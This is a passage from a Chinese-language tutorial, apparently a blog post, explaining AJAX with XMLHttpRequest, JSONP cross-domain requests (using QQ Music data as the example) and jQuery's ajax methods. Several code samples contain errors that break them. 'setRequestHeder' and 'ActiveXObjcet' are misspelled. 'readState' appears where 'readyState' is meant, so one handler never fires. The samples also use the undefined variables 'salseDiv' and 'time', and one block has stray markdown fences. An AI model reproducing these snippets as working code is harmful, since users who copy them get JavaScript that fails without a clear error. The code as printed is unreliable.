<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.open(<span class="string">"POST"</span>,demo.php,<span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeder(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded;charset=UTF-8"</span>);</span><br><span class="line">xhr.sen</span><br></pre></td></tr></table></figure>
<h4 id="4-处理响应"><a class="markdownIt-Anchor" href="#4-处理响应"></a> 4、处理响应</h4>
<hr />
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>onreadystatechange</code> ：当处理过程发生变化的时候执行下面的函数</p>
</li>
<li>
<p><code>readyState</code> ：<code>ajax</code>处理过程</p>
<ul>
<li>0：请求未初始化（还没有调用 <code>open()</code>）。</li>
<li>1：请求已经建立，但是还没有发送（还没有调用 <code>send()</code>）。</li>
<li>2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。</li>
<li>3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。</li>
<li>4：响应已完成；您可以获取并使用服务器的响应了。</li>
</ul>
</li>
<li>
<p><code>status</code>属性：</p>
<ul>
<li>200:“OK”</li>
<li>404: 未找到页面</li>
</ul>
</li>
<li>
<p><code>responseText</code>：获得字符串形式的响应数据</p>
</li>
<li>
<p><code>responseXML</code>：获得 <code>XML</code>形式的响应数据</p>
</li>
<li>
<p>对象转换为JSON格式使用<code>JSON.stringify</code></p>
</li>
<li>
<p><code>json</code>转换为对象格式用<code>JSON.parse()</code></p>
</li>
<li>
<p>返回值一般为<code>json</code>字符串，可以用<code>JSON.parse(xhr.responseText)</code>转化为<code>JSON</code>对象</p>
</li>
<li>
<p><strong>从服务器传回的数据是json格式，这里做一个例子说明，如何利用</strong></p>
<ul>
<li>1、首先需要从<code>XMLHttpRequest</code>对象取回数据这是一个<code>JSON</code>串，把它转换为真正的<code>JavaScript</code>对象。使用<code>JSON.parse(xhr.responseText)</code>转化为<code>JSON</code>对象</li>
<li>2、遍历得到的数组，向<code>DOM</code>中添加新元素</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params">responseText</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> saleDiv= <span class="built_in">document</span>.getElementById(<span class="string">"sales"</span>);</span><br><span class="line"><span class="keyword">var</span> sales = <span class="built_in">JSON</span>.parse(responseText);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;sales.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> sale = sales[i];</span><br><span class="line">         <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">         div.setAttribute(<span class="string">"class"</span>,<span class="string">"salseItem"</span>);</span><br><span class="line">        div.innerHTML = sale.name + sale.sales;</span><br><span class="line">        salseDiv.appendChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-ae7614423c64ebb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="HTTP状态码" /></p>
<h4 id="5-封装例子"><a class="markdownIt-Anchor" href="#5-封装例子"></a> 5、封装例子</h4>
<hr />
<ul>
<li>将AJAX请求封装成ajax()方法，它接受一个配置对象params</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">params</span>) </span>&#123;   </span><br><span class="line">  params = params || &#123;&#125;;   </span><br><span class="line">  params.data = params.data || &#123;&#125;;   </span><br><span class="line">  <span class="comment">// 判断是ajax请求还是jsonp请求</span></span><br><span class="line">  <span class="keyword">var</span> json = params.jsonp ? jsonp(params) : json(params);   </span><br><span class="line">  <span class="comment">// ajax请求   </span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">params</span>) </span>&#123;   </span><br><span class="line">    <span class="comment">//  请求方式，默认是GET</span></span><br><span class="line">    params.type = (params.type || <span class="string">'GET'</span>).toUpperCase(); </span><br><span class="line">    <span class="comment">// 避免有特殊字符，必须格式化传输数据  </span></span><br><span class="line">    params.data = formatParams(params.data);   </span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="literal">null</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化XMLHttpRequest对象   </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;   </span><br><span class="line">      xhr = <span class="keyword">new</span> XMLHttpRequest();   </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">      <span class="comment">// IE6及其以下版本   </span></span><br><span class="line">      xhr = <span class="keyword">new</span> ActiveXObjcet(<span class="string">'Microsoft.XMLHTTP'</span>);   </span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用实例：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ajax(&#123;   </span><br><span class="line">  url: <span class="string">'test.php'</span>,   <span class="comment">// 请求地址</span></span><br><span class="line">  type: <span class="string">'POST'</span>,   <span class="comment">// 请求类型，默认"GET"，还可以是"POST"</span></span><br><span class="line">  data: &#123;<span class="string">'b'</span>: <span class="string">'异步请求'</span>&#125;,   <span class="comment">// 传输数据</span></span><br><span class="line">  success: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;   <span class="comment">// 请求成功的回调函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(res));   </span><br><span class="line">  &#125;,</span><br><span class="line">  error: <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;&#125;   <span class="comment">// 请求失败的回调函数</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>这个过程是一定要记在脑子里的</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">url, success, fail</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建连接</span></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="literal">null</span>;</span><br><span class="line">    xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    <span class="comment">// 2. 连接服务器</span></span><br><span class="line">    xhr.open(<span class="string">'get'</span>, url, <span class="literal">true</span>)</span><br><span class="line">    <span class="comment">// 3. 发送请求</span></span><br><span class="line">    xhr.send(<span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// 4. 接受请求</span></span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(xhr.status == <span class="number">200</span>)&#123;</span><br><span class="line">                success(xhr.responseText);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// fail</span></span><br><span class="line">                fail &amp;&amp; fail(xhr.status);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/1480597-9ea8be2721ca01c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="XMLHttpRequest 在异步请求远程数据时的工作流程" /></p>
<h5 id="谈谈jsonp"><a class="markdownIt-Anchor" href="#谈谈jsonp"></a> 谈谈JSONP</h5>
<hr />
<ul>
<li>
<p>要访问web服务器的数据除了XMLHttpRequest外还有一种方法是JSONP</p>
</li>
<li>
<p>如果HTML和JavaScript与数据同时在同一个机器上，就可以使用XMLHttpRequest</p>
</li>
<li>
<p>什么是JSONP？</p>
<ul>
<li>JSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）</li>
</ul>
</li>
<li>
<p>JSONP有什么用？</p>
<ul>
<li>由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求</li>
</ul>
</li>
<li>
<p>如何使用JSONP？</p>
<ul>
<li>在客户端声明回调函数之后，客户端通过script标签向服务器跨域请求数据，然后服务端返回相应的数据并动态执行回调函数</li>
</ul>
</li>
<li>
<p>用XMLHttpRequest时，我们得到一个字符串；要用JSON.parse把字符串转化成对象，使用jsonp时，script标志会解析并执行返回的代码，等我们处理数据时，已经是一个JavaScript对象了</p>
</li>
<li>
<p>简单实例</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span>  </span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">jsonpCallback</span><span class="params">(result)</span> </span>&#123;  </span></span><br><span class="line">        alert(result.a);  </span><br><span class="line">        alert(result.b);  </span><br><span class="line">        alert(result.c);  </span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> result) &#123;  </span></span><br><span class="line"><span class="actionscript">            alert(i+<span class="string">":"</span>+result[i]);<span class="comment">//循环输出a:1,b:2,etc.  </span></span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://crossdomain.com/services.php?callback=jsonpCallback"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--callback参数指示生成JavaScript代码时要使用的函数jsonpcallback--&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意浏览器的缓存问题
<ul>
<li>在末尾增加一个随机数可避免频繁请求同一个链接出现的缓存问题</li>
<li>`<script type="text/javascript" src="http://crossdomain.com/services.php?callback=jsonpCallback&random=(new Date()).getTime()"></script></li>
</ul>
</li>
</ul>
<p><strong>原生JavaScript实现完整的Ajax、JSONP例子</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">	params = params || &#123;&#125;;</span><br><span class="line">	params.data = params.data || &#123;&#125;;</span><br><span class="line">	<span class="keyword">var</span> json = params.jsonp ? jsonp(params) : json(params);</span><br><span class="line">	<span class="comment">// ajax请求</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">		params.type = (params.type || <span class="string">'GET'</span>).toUpperCase();</span><br><span class="line">		params.data = formatParams(params.data);</span><br><span class="line">		<span class="keyword">var</span> xhr = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化XMLHttpRequest对象</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">			xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// IE6及其以下版本</span></span><br><span class="line">			xhr = <span class="keyword">new</span> ActiveXObjcet(<span class="string">'Microsoft.XMLHTTP'</span>);</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 监听事件</span></span><br><span class="line">		xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">				<span class="keyword">var</span> status = xhr.status;</span><br><span class="line">				<span class="keyword">if</span>(status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>) &#123;</span><br><span class="line">					<span class="keyword">var</span> response = <span class="string">''</span>;</span><br><span class="line">					<span class="keyword">var</span> type = xhr.getResponseHeader(<span class="string">'Content-type'</span>);</span><br><span class="line">					<span class="keyword">if</span>(type.indexOf(<span class="string">'xml'</span>) !== <span class="number">-1</span> &amp;&amp; xhr.responseXML) &#123;</span><br><span class="line">						response = xhr.responseXML; <span class="comment">//Document对象响应</span></span><br><span class="line">					&#125; <span class="keyword">else</span> <span class="keyword">if</span>(type === <span class="string">'application/json'</span>) &#123;</span><br><span class="line">						response = <span class="built_in">JSON</span>.parse(xhr.responseText); <span class="comment">//JSON响应</span></span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						response = xhr.responseText; <span class="comment">//字符串响应</span></span><br><span class="line">					&#125;;</span><br><span class="line">					params.success &amp;&amp; params.success(response);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					params.error &amp;&amp; params.error(status);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 连接和传输数据</span></span><br><span class="line">		<span class="keyword">if</span>(params.type == <span class="string">'GET'</span>) &#123;</span><br><span class="line">			xhr.open(params.type, params.url + <span class="string">'?'</span> + params.data, <span class="literal">true</span>);</span><br><span class="line">			xhr.send(<span class="literal">null</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			xhr.open(params.type, params.url, <span class="literal">true</span>);</span><br><span class="line">			<span class="comment">//设置提交时的内容类型</span></span><br><span class="line">			xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>);</span><br><span class="line">			xhr.send(params.data);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// jsonp请求</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">		<span class="comment">//创建script标签并加入到页面中</span></span><br><span class="line">		<span class="keyword">var</span> callbackName = params.jsonp;</span><br><span class="line">		<span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">		<span class="comment">// 设置传递给后台的回调参数名</span></span><br><span class="line">		params.data[<span class="string">'callback'</span>] = callbackName;</span><br><span class="line">		<span class="keyword">var</span> data = formatParams(params.data);</span><br><span class="line">		<span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">		head.appendChild(script);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建jsonp回调函数</span></span><br><span class="line">		<span class="built_in">window</span>[callbackName] = <span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">			head.removeChild(script);</span><br><span class="line">			clearTimeout(script.timer);</span><br><span class="line">			<span class="built_in">window</span>[callbackName] = <span class="literal">null</span>;</span><br><span class="line">			params.success &amp;&amp; params.success(json);</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//发送请求</span></span><br><span class="line">		script.src = params.url + <span class="string">'?'</span> + data;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//超时处理</span></span><br><span class="line">		<span class="keyword">if</span>(params.time) &#123;</span><br><span class="line">			script.timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">				<span class="built_in">window</span>[callbackName] = <span class="literal">null</span>;</span><br><span class="line">				head.removeChild(script);</span><br><span class="line">				params.error &amp;&amp; params.error(&#123;</span><br><span class="line">					message: <span class="string">'超时'</span></span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;, time);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">//格式化参数</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">formatParams</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> arr = [];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> name <span class="keyword">in</span> data) &#123;</span><br><span class="line">			arr.push(<span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(data[name]));</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 添加一个随机数，防止缓存</span></span><br><span class="line">		arr.push(<span class="string">'v='</span> + random());</span><br><span class="line">		<span class="keyword">return</span> arr.join(<span class="string">'&amp;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取随机数</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10000</span> + <span class="number">500</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ajax(&#123;</span><br><span class="line">				url: <span class="string">'get.php'</span>,</span><br><span class="line">				type: <span class="string">'GET'</span>,</span><br><span class="line">				data: &#123;<span class="string">'intro'</span>: <span class="string">'get请求'</span>&#125;,</span><br><span class="line">				success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">					res = <span class="built_in">JSON</span>.parse(res);</span><br><span class="line">					<span class="built_in">document</span>.getElementById(<span class="string">'a'</span>).innerHTML = res.intro;</span><br><span class="line">					<span class="built_in">console</span>.log(res);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		ajax(&#123;</span><br><span class="line">				url: <span class="string">'post.php'</span>,</span><br><span class="line">				type: <span class="string">'POST'</span>,</span><br><span class="line">				data: &#123;<span class="string">'intro'</span>: <span class="string">'post请求'</span>&#125;,</span><br><span class="line">				success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">					res = <span class="built_in">JSON</span>.parse(res);</span><br><span class="line">					<span class="built_in">document</span>.getElementById(<span class="string">'b'</span>).innerHTML = res.intro;</span><br><span class="line">					<span class="built_in">console</span>.log(res);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		ajax(&#123;</span><br><span class="line">				url: <span class="string">'http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js'</span>,</span><br><span class="line">				jsonp: <span class="string">'jsonpCallback'</span>,</span><br><span class="line">				data: &#123;<span class="string">'callback'</span>: <span class="string">'jsonpCallback'</span>&#125;,</span><br><span class="line">				success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">					JsonCallback(json);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>下面我们就根据以上 封装的例子跨域获取qq音乐的数据</p>
</blockquote>
<ul>
<li><a href="http://codepen.io/poetries/pen/oBMKmG" target="_blank" rel="noopener">在线演示–跨域获取qq音乐的数据</a></li>
</ul>
<p><strong>下面的方法也可以实现</strong></p>
<ul>
<li>使用jQuery实现</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"jquery-3.1.0.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">			$.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">				  type: <span class="string">"get"</span>,</span></span><br><span class="line"><span class="javascript">				  <span class="keyword">async</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="actionscript">				  url: <span class="string">"http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js"</span>,</span></span><br><span class="line"><span class="actionscript">				  dataType: <span class="string">"jsonp"</span>,</span></span><br><span class="line"><span class="actionscript">				  jsonp: <span class="string">"callback"</span>,</span></span><br><span class="line"><span class="actionscript">				  jsonpCallback: <span class="string">"JsonCallback"</span>,</span></span><br><span class="line"><span class="actionscript">				  scriptCharset: <span class="string">'GBK'</span>,<span class="comment">//设置编码，否则会乱码</span></span></span><br><span class="line"><span class="actionscript">				  success: <span class="function"><span class="keyword">function</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">				    <span class="comment">//var result = JSON.stringify(data);</span></span></span><br><span class="line">					  JsonCallback(data);</span><br><span class="line">				  &#125;,</span><br><span class="line"><span class="actionscript">				  error: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">				    alert(<span class="string">'fail'</span>);</span></span><br><span class="line">				  &#125;</span><br><span class="line">				&#125;);</span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">JsonCallback</span><span class="params">(json)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">var</span> data = json.songlist;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">var</span> html = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">				<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;data.length;i++) &#123;</span></span><br><span class="line"><span class="javascript">					<span class="built_in">document</span>.write(data[i].url+<span class="string">"&lt;br&gt;"</span>);</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">```      </span><br><span class="line"></span><br><span class="line">- 原生js简洁实现</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">var script = document.createElement("script");</span><br><span class="line">			script.src = 'http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js?callback=JsonCallback';</span><br><span class="line">			document.body.appendChild(script);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			function JsonCallback(json)&#123;</span><br><span class="line">				var data = json.songlist;</span><br><span class="line">				var html = '';</span><br><span class="line">				for (var i=0;i<span class="tag">&lt;<span class="name">data.length;i++)</span> &#123;</span></span><br><span class="line"><span class="tag">					<span class="attr">console.log</span>(<span class="attr">data</span>[<span class="attr">i</span>]);</span></span><br><span class="line"><span class="tag">				&#125;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">			&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="三-jquery中的ajax"><a class="markdownIt-Anchor" href="#三-jquery中的ajax"></a> 三、 jQuery中的Ajax</h3>
<hr />
<ul>
<li>jQuery中的<code>ajax</code>封装案例</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ajax请求后台数据</span></span><br><span class="line"><span class="keyword">var</span> btn =  <span class="built_in">document</span>.getElementsByTagName(<span class="string">"input"</span>)[<span class="number">0</span>];</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	</span><br><span class="line">	ajax(&#123;<span class="comment">//json格式</span></span><br><span class="line">		type:<span class="string">"post"</span>,</span><br><span class="line">		url:<span class="string">"post.php"</span>,</span><br><span class="line">		data:<span class="string">"username=poetries&amp;pwd=123456"</span>,</span><br><span class="line">		asyn:<span class="literal">true</span>,</span><br><span class="line">		success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">			<span class="built_in">document</span>.write(data);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//封装ajax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">aJson</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> ajx = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">var</span> type = aJson.type || <span class="string">"get"</span>;</span><br><span class="line">	<span class="keyword">var</span> asyn = aJson.asyn || <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">var</span> url = aJson.url;		<span class="comment">// url 接收 传输位置</span></span><br><span class="line">	<span class="keyword">var</span> success = aJson.success;<span class="comment">// success 接收 传输完成后的回调函数</span></span><br><span class="line">	<span class="keyword">var</span> data = aJson.data || <span class="string">''</span>;<span class="comment">// data 接收需要附带传输的数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;<span class="comment">//兼容处理</span></span><br><span class="line">		ajx = <span class="keyword">new</span> XMLHttpRequest();<span class="comment">//一般浏览器</span></span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		ajx = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);<span class="comment">//IE6+</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">"get"</span> &amp;&amp; data)</span><br><span class="line">	&#123;</span><br><span class="line">		url +=<span class="string">"/?"</span>+data+<span class="string">"&amp;"</span>+<span class="built_in">Math</span>.random();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//初始化ajax请求</span></span><br><span class="line">	ajx.open( type , url , asyn );</span><br><span class="line">	<span class="comment">//规定传输数据的格式</span></span><br><span class="line">	ajx.setRequestHeader(<span class="string">'content-type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">	<span class="comment">//发送ajax请求（包括post数据的传输）</span></span><br><span class="line">	type == <span class="string">"get"</span> ?ajx.send():ajx.send(aJson.data);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//处理请求</span></span><br><span class="line">	ajx.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params">aJson</span>)</span>&#123;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span>(ajx.readState == <span class="number">4</span>)&#123;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span> (ajx.status == <span class="number">200</span> &amp;&amp; ajx.status&lt;<span class="number">300</span>)<span class="comment">//200是HTTP 请求成功的状态码</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//请求成功处理数据</span></span><br><span class="line">			success &amp;&amp; success(ajx.responseText);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			alert(<span class="string">"请求出错"</span>+ajx.status);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="jquery中的ajax的一些方法"><a class="markdownIt-Anchor" href="#jquery中的ajax的一些方法"></a> jQuery中的Ajax的一些方法</h4>
<hr />
<p><code>jquery</code>对<code>Ajax</code>操作进行了封装，在<code>jquery</code>中的<code>$.ajax()</code>方法属于最底层的方法，第<code>2</code>层是<code>load()</code>、<code>$.get()</code>、<code>$.post();</code>第<code>3</code>层是<code>$.getScript()</code>、<code>$.getJSON()</code>，第<code>2</code>层使用频率很高</p>
<h5 id="load方法"><a class="markdownIt-Anchor" href="#load方法"></a> <code>load()</code>方法</h5>
<hr />
<ul>
<li><code>load()</code>方法是<code>jquery</code>中最简单和常用的<code>ajax</code>方法，能载入远程<code>HTML</code>代码并插入<code>DOM</code>中 结构为：<code>load(url,[data],[callback])</code></li>
<li>使用<code>url</code>参数指定选择符可以加载页面内的某些元素 <code>load</code>方法中<code>url</code>语法：<code>url selector</code> 注意：<code>url</code>和选择器之间有一个空格</li>
<li>传递方式
<ul>
<li><code>load()</code>方法的传递方式根据参数<code>data</code>来自动指定，如果没有参数传递，则采用<code>GET</code>方式传递，反之，采用<code>POST</code></li>
</ul>
</li>
<li>回调参数
<ul>
<li>必须在加载完成后才执行的操作，该函数有三个参数 分别代表请求返回的内容、请求状态、<code>XMLHttpRequest</code>对象</li>
<li>只要请求完成，回调函数就会被触发</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#testTest"</span>).load(<span class="string">"test.html"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">responseText,textStatus,XMLHttpRequest</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//respnoseText 请求返回的内容</span></span><br><span class="line">    <span class="comment">//textStatus 请求状态 ：sucess、error、notmodified、timeout</span></span><br><span class="line">    <span class="comment">//XMLHttpRequest </span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>load方法参数</strong></li>
</ul>
<table>
<thead>
<tr>
<th>参数名称</th>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
